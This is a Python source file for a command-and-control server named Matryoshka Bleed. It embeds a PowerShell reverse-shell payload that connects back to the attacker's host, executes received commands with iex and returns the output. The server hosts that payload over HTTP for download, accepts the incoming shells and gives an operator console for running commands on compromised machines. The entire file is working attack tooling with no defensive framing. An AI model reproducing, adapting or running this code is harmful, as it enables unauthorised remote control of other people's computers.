#!/usr/bin/env python3
# MATRYOSHKA BLEED - C2 Server
# LEPAD (Legacy Parameter Descent) C2 Controller
# GitHub: https://github.com/Sshhxd/Matryoshka-Bleed

import socket
import threading
import queue
import time
import sys
import http.server
import socketserver

# Active sessions storage
sessions = {}
command_queues = {}
output_buffer = {}

# ========== REVERSE SHELL PAYLOAD ==========
PAYLOAD_PS1 = '''# Matryoshka Bleed Reverse Shell
$server = "SERVER_IP"
$port = 5555
$session_id = [System.Guid]::NewGuid().ToString()

while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($server, $port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        $writer.WriteLine($session_id)
        $writer.Flush()
        
        while($client.Connected) {
            $cmd = $reader.ReadLine()
            if ($cmd -eq "exit") { break }
            
            try {
                $result = iex $cmd 2>&1 | Out-String
                if ($result.Length -eq 0) { $result = "[OK] Command completed" }
            } catch {
                $result = "ERROR: " + $_.Exception.Message
            }
            
            $writer.WriteLine($result)
            $writer.Flush()
        }
    } catch {
        Start-Sleep -Seconds 5
    }
}
'''

class TCPServer:
    def handle_client(self, conn, addr):
        try:
            # Wait for session ID (only reverse shell sends this)
            conn.settimeout(5.0)
            session_id = conn.recv(1024).decode().strip()
            conn.settimeout(None)
        except:
            conn.close()
            return
            
        sessions[session_id] = {
            'ip': addr[0],
            'port': addr[1],
            'last_seen': time.strftime('%H:%M:%S'),
            'conn': conn
        }
        command_queues[session_id] = queue.Queue()
        output_buffer[session_id] = ""
        
        print(f"\n[+] NEW SHELL: {session_id[:8]}... from {addr[0]}")
        print(f"[+] Active shells: {len(sessions)}")
        
        try:
            while True:
                if not command_queues[session_id].empty():
                    cmd = command_queues[session_id].get()
                    conn.send((cmd + "\n").encode())
                    
                    output = ""
                    conn.settimeout(5.0)
                    try:
                        while True:
                            data = conn.recv(65535).decode()
                            output += data
                            if data.endswith("\n"):
                                break
                    except socket.timeout:
                        pass
                    conn.settimeout(None)
                    
                    output_buffer[session_id] = output
                    sessions[session_id]['last_seen'] = time.strftime('%H:%M:%S')
                
                time.sleep(0.05)
        except:
            pass
        finally:
            if session_id in sessions:
                print(f"\n[-] Shell {session_id[:8]}... disconnected")
                del sessions[session_id]
                del command_queues[session_id]
                del output_buffer[session_id]

class PayloadHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/payload.ps1':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(PAYLOAD_PS1.encode())
            print(f"[HTTP] Payload served to {self.client_address[0]}")
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

def print_banner():
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║     ┳┳┓ ┏┓ ┏┳┓ ┳┓ ┓┏ ┏┓ ┏┓ ┓┏ ┓┏┓ ┏┓   ┳┓ ┓  ┏┓ ┏┓ ┳┓    ║
    ║     ┃┃┃ ┣┫  ┃  ┣┫ ┗┫ ┃┃ ┗┓ ┣┫ ┃┫  ┣┫   ┣┫ ┃  ┣  ┣  ┃┃    ║
    ║     ┛ ┗ ┛┗  ┻  ┛┗ ┗┛ ┗┛ ┗┛ ┛┗ ┛┗┛ ┛┗   ┻┛ ┗┛ ┗┛ ┗┛ ┻┛    ║
    ║                                                          ║
    ║   ================ MATRYOSHKA BLEED C2 ===============   ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    """)

def show_help():
    print("""
COMMANDS:
  help              - Show this help
  list              - List active reverse shells
  interact <id>     - Interact with a shell (use first 8 chars)
  kill <id>         - Kill a specific shell
  killall           - Kill all shells
  exit              - Exit server

INTERACT MODE:
  <command>         - Execute PowerShell command on target
  back              - Return to main menu
  exit              - Terminate session
""")

def start_tcp_server(port=5555):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f"[TCP] Listener started on port {port}")
    
    while True:
        conn, addr = server.accept()
        tcp_server = TCPServer()
        thread = threading.Thread(target=tcp_server.handle_client, args=(conn, addr))
        thread.daemon = True
        thread.start()

def start_http_server(port=4444):
    with socketserver.TCPServer(("0.0.0.0", port), PayloadHandler) as httpd:
        print(f"[HTTP] Payload server started on port {port}")
        httpd.serve_forever()

def interactive_session(session_id):
    if session_id not in sessions:
        print("[-] Session not found")
        return
    
    print(f"\n[+] Interacting with {session_id[:8]}... ({sessions[session_id]['ip']})")
    print("[+] Type 'back' to return, 'exit' to terminate session\n")
    
    while True:
        try:
            cmd = input(f"LEPAD({session_id[:8]})> ").strip()
            
            if cmd == "back":
                break
            elif cmd == "exit":
                if session_id in command_queues:
                    command_queues[session_id].put("exit")
                time.sleep(0.3)
                if session_id in sessions:
                    sessions[session_id]['conn'].close()
                print("[-] Session terminated")
                break
            elif cmd == "":
                continue
            else:
                if session_id not in command_queues:
                    print("[-] Session lost")
                    break
                    
                command_queues[session_id].put(cmd)
                
                for _ in range(50):
                    time.sleep(0.1)
                    if session_id in output_buffer and output_buffer[session_id]:
                        print(output_buffer[session_id].strip())
                        output_buffer[session_id] = ""
                        break
        except KeyboardInterrupt:
            print("\n[!] Use 'back' to exit")

def main():
    print_banner()
    
    # Auto-detect server IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        server_ip = s.getsockname()[0]
    except:
        server_ip = "127.0.0.1"
    s.close()
    
    # Update payload with correct IP
    global PAYLOAD_PS1
    PAYLOAD_PS1 = PAYLOAD_PS1.replace("SERVER_IP", server_ip)
    
    print(f"\n  [*] Server IP: {server_ip}")
    print(f"  [*] Reverse shell port: 5555")
    print(f"  [*] Payload URL: http://{server_ip}:4444/payload.ps1")
    
    # Start servers
    tcp_thread = threading.Thread(target=start_tcp_server, args=(5555,))
    tcp_thread.daemon = True
    tcp_thread.start()
    
    http_thread = threading.Thread(target=start_http_server, args=(4444,))
    http_thread.daemon = True
    http_thread.start()
    
    time.sleep(2)
    
    print(f"\n  [!] READY! Waiting for reverse shells...")
    print(f"  [!] Type 'help' for commands\n")
    
    # Main command loop
    while True:
        try:
            cmd = input("C2> ").strip().lower()
            
            if cmd == "help":
                show_help()
            
            elif cmd == "list":
                if not sessions:
                    print("[-] No active shells")
                else:
                    print("\n" + "-" * 60)
                    print("ACTIVE SHELLS:")
                    print("-" * 60)
                    for sid, sess in sessions.items():
                        print(f"  {sid[:8]}... | {sess['ip']} | Last: {sess['last_seen']}")
                    print("-" * 60)
            
            elif cmd.startswith("interact "):
                parts = cmd.split()
                if len(parts) == 2:
                    target = parts[1]
                    matches = [sid for sid in sessions if sid.startswith(target)]
                    if len(matches) == 1:
                        interactive_session(matches[0])
                    elif len(matches) > 1:
                        print(f"[-] Multiple matches: {[m[:8] for m in matches]}")
                    else:
                        print(f"[-] Shell '{target}' not found")
                else:
                    print("[-] Usage: interact <session_id_prefix>")
            
            elif cmd.startswith("kill "):
                parts = cmd.split()
                if len(parts) == 2:
                    target = parts[1]
                    matches = [sid for sid in sessions if sid.startswith(target)]
                    if len(matches) == 1:
                        sid = matches[0]
                        if sid in command_queues:
                            command_queues[sid].put("exit")
                        time.sleep(0.3)
                        if sid in sessions:
                            sessions[sid]['conn'].close()
                        print(f"[-] Killed shell {sid[:8]}...")
                    else:
                        print(f"[-] Shell '{target}' not found")
                else:
                    print("[-] Usage: kill <session_id_prefix>")
            
            elif cmd == "killall":
                for sid in list(sessions.keys()):
                    if sid in command_queues:
                        command_queues[sid].put("exit")
                    time.sleep(0.1)
                    if sid in sessions:
                        sessions[sid]['conn'].close()
                sessions.clear()
                command_queues.clear()
                output_buffer.clear()
                print("[+] All shells killed")
            
            elif cmd == "exit":
                print("[!] Shutting down...")
                for sid in list(sessions.keys()):
                    try:
                        if sid in command_queues:
                            command_queues[sid].put("exit")
                        if sid in sessions:
                            sessions[sid]['conn'].close()
                    except:
                        pass
                sys.exit(0)
            
            elif cmd == "":
                continue
            
            else:
                print("[-] Unknown command. Type 'help'")
                
        except KeyboardInterrupt:
            print("\n[!] Type 'exit' to quit")
            continue

if __name__ == "__main__":
    main()